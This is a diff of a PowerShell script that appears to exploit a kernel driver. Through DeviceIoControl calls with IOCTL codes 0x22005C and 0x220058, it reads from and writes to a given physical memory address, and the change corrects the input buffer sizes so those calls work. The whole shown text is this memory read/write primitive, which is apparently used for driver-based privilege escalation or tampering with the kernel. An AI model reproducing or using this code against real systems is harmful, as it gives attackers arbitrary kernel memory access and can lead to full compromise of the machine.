@@ -22,11 +22,10 @@ try {
   # ~~~~~~~~~ @
 
   try {
-    $SizeCeiling = [Math]::Max(24, $SizeToRead)
+    $SizeCeiling = [Math]::Max(0x18, $SizeToRead)
     $InOutPtr    = New-IntPtr -Size $SizeCeiling -TypeSize ([Int64], [Int64], [Int32], [Int32]) -Values (0L, $PA, $SizeToRead, 0)
-    $InvokeCall  = Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x22005C -InOutPtr $InOutPtr -InputSize 24 -OutputSize $SizeToRead
-    
-    [String]::Format("DeviceIO Read Call --> {0} (Bytes Returned: {1})", $InvokeCall.Success, $InvokeCall.BytesRet)   
+    $InvokeCall  = Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x22005C -InOutPtr $InOutPtr -InputSize $SizeCeiling -OutputSize $SizeToRead
+    [String]::Format("DeviceIO Read Call --> {0} (Bytes Returned: {1})", $InvokeCall.Success, $InvokeCall.BytesRet)
     if ($InvokeCall.Success) {
         $Buffer = [Byte[]]::new($SizeToRead)
         [marshal]::Copy($InOutPtr, $Buffer, 0, $SizeToRead)
@@ -45,10 +44,10 @@ try {
   if ($Buffer) {
       try {
         Write-Host
-        $SizeCeiling = 0x14 + $Buffer.Length
+        $SizeCeiling = [Math]::Max(0x18, 0x14 + $Buffer.Length)
         $InOutPtr    = New-IntPtr -Size $SizeCeiling -TypeSize ([Int64], [Int64], [Int32], [Int32]) -Values (0L, $PA, $Buffer.Length, 0)
         [marshal]::Copy($Buffer, 0, ([IntPtr]::Add($InOutPtr, 0x14)), $Buffer.Length)
-        $InvokeCall  = Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x220058 -InOutPtr $InOutPtr -InputSize 32 -OutputSize 0
+        $InvokeCall  = Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x220058 -InOutPtr $InOutPtr -InputSize $SizeCeiling -OutputSize 0
         [String]::Format("DeviceIO Write Call --> {0} (Bytes Returned: {1})", $InvokeCall.Success, $InvokeCall.BytesRet)
       } finally {
           Free-IntPtr $InOutPtr -Method Auto
